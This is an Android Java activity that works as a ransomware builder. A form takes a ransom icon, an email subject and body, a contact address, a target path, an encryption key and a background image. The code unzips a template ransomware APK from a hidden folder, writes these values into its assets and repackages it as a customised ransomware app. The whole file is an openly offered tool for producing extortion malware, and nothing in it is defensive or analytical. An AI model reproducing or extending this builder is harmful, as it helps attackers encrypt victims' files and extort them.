package com.mgtols.neptyx;

import android.app.Activity;
import android.app.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.webkit.*;
import android.animation.*;
import android.view.animation.*;
import java.util.*;
import java.util.regex.*;
import java.text.*;
import org.json.*;
import android.widget.LinearLayout;
import android.widget.ImageView;
import android.widget.EditText;
import android.widget.Button;
import android.content.Intent;
import android.net.Uri;
import android.view.View;
import android.app.Fragment;
import android.app.FragmentManager;
import android.app.DialogFragment;
import android.Manifest;
import android.content.pm.PackageManager;


public class RansActivity extends  Activity { 
	
	
	private String basa = "";
	private String fina = "";
	private String finalPath = "";
	private String dir = "";
	
	private LinearLayout linear1;
	private ImageView imageview1;
	private LinearLayout linear2;
	private EditText icono;
	private EditText asunto;
	private EditText cuerpo;
	private EditText email;
	private EditText ruta;
	private EditText encriptar;
	private EditText fondo;
	private LinearLayout linear3;
	private Button button1;
	
	private Intent a = new Intent();
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.rans);
		initialize(_savedInstanceState);
		if (Build.VERSION.SDK_INT >= 23) {
			if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED
			|| checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
				requestPermissions(new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1000);
			}
			else {
				initializeLogic();
			}
		}
		else {
			initializeLogic();
		}
	}
	@Override
	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
		if (requestCode == 1000) {
			initializeLogic();
		}
	}
	
	private void initialize(Bundle _savedInstanceState) {
		
		linear1 = (LinearLayout) findViewById(R.id.linear1);
		imageview1 = (ImageView) findViewById(R.id.imageview1);
		linear2 = (LinearLayout) findViewById(R.id.linear2);
		icono = (EditText) findViewById(R.id.icono);
		asunto = (EditText) findViewById(R.id.asunto);
		cuerpo = (EditText) findViewById(R.id.cuerpo);
		email = (EditText) findViewById(R.id.email);
		ruta = (EditText) findViewById(R.id.ruta);
		encriptar = (EditText) findViewById(R.id.encriptar);
		fondo = (EditText) findViewById(R.id.fondo);
		linear3 = (LinearLayout) findViewById(R.id.linear3);
		button1 = (Button) findViewById(R.id.button1);
		
		imageview1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				a.setAction(Intent.ACTION_VIEW);
				a.setClass(getApplicationContext(), ViruscActivity.class);
				startActivity(a);
				finish();
			}
		});
		
		button1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				FileUtil.makeDir(FileUtil.getExternalStorageDir().concat("/MgToLs/Ransomware"));
				basa = FileUtil.getExternalStorageDir().concat("/MgToLs/");
				fina = FileUtil.getExternalStorageDir().concat("/MgToLs/Ransomware/");
				finalPath = FileUtil.getExternalStorageDir().concat("/.mgtols/Ransomware.apk");
				dir = "res/drawable-xhdpi-v4/";
				_UnZip(finalPath, fina);
				FileUtil.copyFile(icono.getText().toString(), fina.concat(dir.concat("app_icon.png")));
				FileUtil.writeFile(fina.concat("assets/ruta.txt"), ruta.getText().toString());
				FileUtil.writeFile(fina.concat("assets/asunto.txt"), asunto.getText().toString());
				FileUtil.writeFile(fina.concat("assets/correo.txt"), cuerpo.getText().toString());
				FileUtil.writeFile(fina.concat("assets/firma.txt"), email.getText().toString());
				FileUtil.writeFile(fina.concat("assets/encriptado.txt"), encriptar.getText().toString());
				FileUtil.copyFile(fondo.getText().toString(), fina.concat(dir.concat("ran.png")));
				_call(FileUtil.getExternalStorageDir().concat("/MgToLs/Ransomware"), FileUtil.getExternalStorageDir().concat("/MgToLs/Ransomware.apk"));
				FileUtil.deleteFile(FileUtil.getExternalStorageDir().concat("/MgToLs/Ransomware"));
				SketchwareUtil.showMessage(getApplicationContext(), "Ransomware creado exitosamente y guardado en: ".concat(FileUtil.getExternalStorageDir().concat("/MgToLs/Ransomware.apk")));
			}
		});
	}
	
	private void initializeLogic() {
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		
		super.onActivityResult(_requestCode, _resultCode, _data);
		
		switch (_requestCode) {
			
			default:
			break;
		}
	}
	
	public void _UnZip (final String _fileZip, final String _destDir) {
		try
		{
			java.io.File outdir = new java.io.File(_destDir);
			java.util.zip.ZipInputStream zin = new java.util.zip.ZipInputStream(new java.io.FileInputStream(_fileZip));
			java.util.zip.ZipEntry entry;
			String name, dir;
			while ((entry = zin.getNextEntry()) != null)
			{
				name = entry.getName();
				if(entry.isDirectory())
				{
					mkdirs(outdir, name);
					continue;
				}
				
				/* this part is necessary because file entry can come before
* directory entry where is file located
* i.e.:
* /foo/foo.txt
* /foo/
*/
				
				dir = dirpart(name);
				if(dir != null)
				mkdirs(outdir, dir);
				
				extractFile(zin, outdir, name);
			}
			zin.close();
		}
		catch (java.io.IOException e)
		{
			e.printStackTrace();
		}
	}
	private static void extractFile(java.util.zip.ZipInputStream in, java.io.File outdir, String name) throws java.io.IOException
	{
		byte[] buffer = new byte[4096];
		java.io.BufferedOutputStream out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(new java.io.File(outdir, name)));
		int count = -1;
		while ((count = in.read(buffer)) != -1)
		out.write(buffer, 0, count);
		out.close();
	}
	
	private static void mkdirs(java.io.File outdir, String path)
	{
		java.io.File d = new java.io.File(outdir, path);
		if(!d.exists())
		d.mkdirs();
	}
	
	private static String dirpart(String name)
	{
		int s = name.lastIndexOf(java.io.File.separatorChar);
		return s == -1 ? null : name.substring(0, s);
	}
	
	
	public void _library () {
	}
	
	public class AppZip {
		List<String> fileList;
		
		AppZip(){
			fileList = new ArrayList<String>();
		}
		
		public void zipIt(String zipFile, String srcFile){
			byte[] buffer = new byte[1024];
			try{
				java.io.FileOutputStream fos = new java.io.FileOutputStream(zipFile);
				java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(fos);
				System.out.println("Output to Zip : " + zipFile);
				for(String file : this.fileList){                                       System.out.println("File Added : " + file);
					java.util.zip.ZipEntry ze= new java.util.zip.ZipEntry(file);
					zos.putNextEntry(ze);   java.io.FileInputStream in = new java.io.FileInputStream(srcFile + java.io.File.separator + file);
					int len;
					while ((len = in.read(buffer)) > 0) {           zos.write(buffer, 0, len);
					}
					in.close();
				}
				zos.closeEntry();
				zos.close();    System.out.println("Done");
			}catch(java.io.IOException ex){
				ex.printStackTrace();
			}
		}
		
		public void generateFileList(java.io.File node, String srcFile){
			if(node.isFile()){              fileList.add(generateZipEntry(node.getAbsoluteFile().toString(), srcFile));
			}
			if(node.isDirectory()){
				String[] subNote = node.list();                 for(String filename : subNote){        generateFileList(new java.io.File(node, filename),srcFile);
				}
			}
		}
		
		private String generateZipEntry(String file, String srcFile){
			return file.substring(srcFile.length()+1, file.length());
		}
	}
	
	
	public void _call (final String _src, final String _output) {
		AppZip appZip = new AppZip();
		appZip.generateFileList(new java.io.File(_src), _src);
		appZip.zipIt(_output, _src);
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input){
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels(){
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels(){
		return getResources().getDisplayMetrics().heightPixels;
	}
	
}